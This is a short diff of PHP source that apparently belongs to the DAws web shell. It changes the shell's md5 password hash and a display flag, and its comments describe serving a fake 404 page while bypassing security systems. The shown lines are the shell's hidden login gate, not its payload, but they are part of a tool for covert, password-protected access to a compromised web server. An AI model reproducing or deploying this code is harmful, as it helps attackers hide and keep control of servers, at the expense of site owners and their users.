@@ -360,10 +360,10 @@ function installed_php($function=null, $class=null) { //checks if a function/cla
 //Now the reason I don't like this much is because there's a lot of important code that needs to be ran first
 //to make sure that we can show a dynamic fake 404 page while bypassing security systems
 if (!isset($_SESSION["logged_in"])) {
-	$show_it = False;
+	$show_it = True;
 	
 	if (isset($_POST["pass"])) {
-		if(md5($_POST["pass"]) == "11b53263cc917f33062363cef21ae6c3") { //DAws
+		if(md5($_POST["pass"]) == "e907a6ddeda3124903af2ff3d5e94ed4") { //DAws
 			$_SESSION["logged_in"] = True;
 		} else {
 			session_destroy();
